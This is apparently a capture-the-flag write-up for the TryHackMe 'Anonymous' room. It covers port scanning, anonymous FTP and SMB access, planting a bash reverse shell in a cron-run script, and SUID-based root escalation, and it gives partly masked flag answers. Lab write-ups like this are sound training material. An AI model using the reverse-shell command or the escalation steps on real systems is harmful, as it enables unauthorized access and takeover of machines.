# TryHackMe Anonymous
**Not the hacking group**

## Task-1 Pwn

* For enumeration we used nmap (*nmap -A -sV -v ip*) and got the answer for some questions below.

1. Enumerate the machine.  How many ports are open?<br>
Answer : 4

2. What service is running on port 21?<br>
Answer : ftp

3. What service is running on ports 139 and 445?<br>
Answer : smb

* For smb enumeration we will use smbclient and the command for the same is 'smbclient //ip/anonymous' and password is also 'anonymmous'. Basically we are doing anonymous login. It will give us sharename in which we can access share 'pics'. 

4. There's a share on the user's computer.  What's it called?<br>
Answer : pics

* Now we know ftp is open from nmap. Login into ftp using 'ftp ip' and then username and password is 'anonymous'. We are successfully logged in. Now type 'ls' and we see a 'scripts' directory. Type 'cd scripts' to move into that directory and again type 'ls'. We see three files. Now type 'get file_name' to get the files in your local shell. Get all the 3 files and then see the content of each file. There is a shell script named 'clean.sh'. We have to change it in order to gain access. Now type 'bash -i >& /dev/tcp/tun0 ip/8888 0>&1' in your shell script and then again go to your ftp shell.

* Now type 'append clean.sh' and simultaneously start your nc listener in another shell using 'nc -lnvp 8888'. You will see a shell in seconds. Type 'ls' and you will see a user.txt file. Now answer the below question.

**If we didn't used 'append' and instead used 'put' to upload clean.sh then we would'nt have execute permission for clean.sh in ftp shell . clean.sh is in fact a cronjob running timely. If you don't want to append then type 'push clean.sh clean.sh' which will update your clean.sh file.**

5. user.txt<br>
Answer : 90d6f992585815ff99**************

* Now type '*find / -perm -u=s 2>/dev/null*' for suid binaries. We got many result but only one of them has a valid suid. You can find the suid's on https://gtfobins.github.io/ . I searched for all the result we got from above command and landed on correct one -'env'. We have valid suid for 'env'. Now type './bin /bash/sh -p' and you will have your root access. Go into root directory and answer the below question.

6. root.txt<br>
Answer : 4d930091c31a622a7ed10f********** 

